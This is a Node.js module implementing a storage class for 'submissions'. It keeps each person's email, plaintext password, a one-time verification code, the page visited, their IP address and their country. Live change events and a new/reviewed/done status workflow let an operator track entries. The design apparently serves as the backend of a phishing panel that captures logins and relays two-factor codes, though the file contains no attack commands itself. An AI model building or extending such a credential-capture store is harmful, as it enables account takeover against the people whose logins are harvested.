import { EventEmitter } from "node:events";
import { randomUUID } from "node:crypto";
import fs from "node:fs";
import path from "node:path";

/* In-memory submission store with an optional JSON file on disk.
 *
 * Everything that reads or writes submissions goes through this class, so
 * replacing it with a database later means re-implementing five methods and
 * keeping the same events.  Events: "add", "update", "remove", "change". */

const STATUSES = ["new", "reviewed", "done"];

export class Store extends EventEmitter {
  constructor({ file = "", seed = true } = {}) {
    super();
    this.file = file;
    this.items = new Map();
    this.load();
    if (this.items.size === 0 && seed) this.seed();
  }

  load() {
    if (!this.file) return;
    try {
      const raw = JSON.parse(fs.readFileSync(this.file, "utf8"));
      for (const item of raw.items ?? []) this.items.set(item.id, item);
    } catch {
      // Missing or unreadable file: start empty.
    }
  }

  save() {
    if (!this.file) return;
    try {
      fs.mkdirSync(path.dirname(this.file), { recursive: true });
      fs.writeFileSync(
        this.file,
        JSON.stringify({ items: [...this.items.values()] }, null, 2)
      );
    } catch {
      // A template must not crash because the disk is read-only.
    }
  }

  seed() {
    const now = Date.now();
    const demo = [
      { email: "demo@example.com", code: "123456", page: "/verify", country: "United States", countryCode: "US" },
      { email: "second@example.com", code: "654321", page: "/terms", country: "Germany", countryCode: "DE" },
    ];
    demo.forEach((item, index) => {
      const id = `demo-${index + 1}`;
      this.items.set(id, {
        id,
        ...item,
        ip: "203.0.113.10",
        status: "new",
        note: "",
        createdAt: new Date(now - (index + 1) * 3600_000).toISOString(),
        updatedAt: new Date(now - (index + 1) * 3600_000).toISOString(),
        demo: true,
      });
    });
    this.save();
  }

  add(input) {
    const now = new Date().toISOString();
    const item = {
      id: randomUUID(),
      email: input.email ?? "",
      password: input.password ?? "",
      code: input.code ?? "",
      page: input.page ?? "/",
      ip: input.ip ?? "",
      country: input.country ?? "",
      countryCode: input.countryCode ?? "",
      status: STATUSES.includes(input.status) ? input.status : "new",
      note: input.note ?? "",
      createdAt: now,
      updatedAt: now,
    };
    this.items.set(item.id, item);
    this.save();
    this.emit("add", item);
    this.emit("change", { type: "add", item });
    return item;
  }

  get(id) {
    return this.items.get(id) ?? null;
  }

  page({ page = 1, pageSize = 10, query = "" } = {}) {
    const size = Math.min(Math.max(Number(pageSize) || 10, 1), 50);
    const q = String(query).trim().toLowerCase();
    const filtered = [...this.items.values()]
      .filter((item) => {
        if (!q) return true;
        return [item.email, item.code, item.country, item.status, item.note]
          .join(" ")
          .toLowerCase()
          .includes(q);
      })
      .sort((a, b) => b.createdAt.localeCompare(a.createdAt));

    const pages = Math.max(1, Math.ceil(filtered.length / size));
    const current = Math.min(Math.max(Number(page) || 1, 1), pages);
    const offset = (current - 1) * size;
    return {
      items: filtered.slice(offset, offset + size),
      total: filtered.length,
      page: current,
      pages,
      pageSize: size,
    };
  }

  update(id, patch = {}) {
    const item = this.items.get(id);
    if (!item) return null;
    if (patch.status !== undefined && STATUSES.includes(patch.status)) {
      item.status = patch.status;
    }
    if (patch.note !== undefined) item.note = String(patch.note).slice(0, 2000);
    item.updatedAt = new Date().toISOString();
    this.save();
    this.emit("update", item);
    this.emit("change", { type: "update", item });
    return item;
  }

  remove(id) {
    const item = this.items.get(id);
    if (!item) return null;
    this.items.delete(id);
    this.save();
    this.emit("remove", item);
    this.emit("change", { type: "remove", item });
    return item;
  }

  stats() {
    const byStatus = Object.fromEntries(STATUSES.map((s) => [s, 0]));
    for (const item of this.items.values()) {
      byStatus[item.status] = (byStatus[item.status] ?? 0) + 1;
    }
    return {
      total: this.items.size,
      byStatus,
      updatedAt: new Date().toISOString(),
    };
  }
}

export { STATUSES };
